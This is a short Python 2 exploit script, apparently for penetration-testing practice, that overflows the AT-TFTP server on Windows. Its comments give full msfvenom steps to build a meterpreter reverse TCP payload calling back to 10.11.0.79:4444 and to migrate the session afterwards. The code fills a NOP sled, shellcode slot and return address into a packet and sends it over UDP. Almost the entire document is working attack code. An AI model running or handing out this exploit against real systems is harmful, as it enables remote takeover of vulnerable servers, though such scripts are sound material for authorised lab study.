import sys, socket
#UPDATE-Apirl_29_2020: I have updated this as other exploits are either incomplete or provide incorrect instructions to generate your cistome shell code

# Please replace it with your shellcode!!!!!!
# msfvenom -p windows/meterpreter/reverse_nonx_tcp LHOST=10.11.0.79 LPORT=4444 -f raw -o exploit_payload
# echo -en "\x81\xec\xac\x0d\x00\x00" > stack_adjustment
# cat stack_adjustment exploit_payload > adjusted_shellcode
# cat adjusted_shellcode | msfvenom -p - -b "\x00" -a x86 --platform Windows -f python
# Recommendation: Due to unstable AT-TFTP, please migrate meterpreter to another application after session open.
# i.e.: set AUTORUNSCRIPT post/windows/manage/migrate

#Copy console output here for your shellcode
buf =  b""
buf += b"\xdd\xc6\xd9\x74\x24\xf4\xba\xcd\x4f\xa7\xff\x58\x29"
buf += b"\xc9\xb1\x01\x83\xc0\x04\x31\x50\x13\x03\x9d\x5c\x45"
buf += b"\x0a"
#----- 
 
 
lhost = sys.argv[1]
host = sys.argv[2]
port = int(sys.argv[3])
ret = "\xd3\xfe\x86\x7c"
   
exploit = "\x00\x02" + "\x90" * (25 - len(lhost)) + buf + ret + "\x83\xc4\x28\xc3\x00netascii\x00"
   
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
client.sendto(exploit, (host, port))
   
print 'Done! Try harder!'
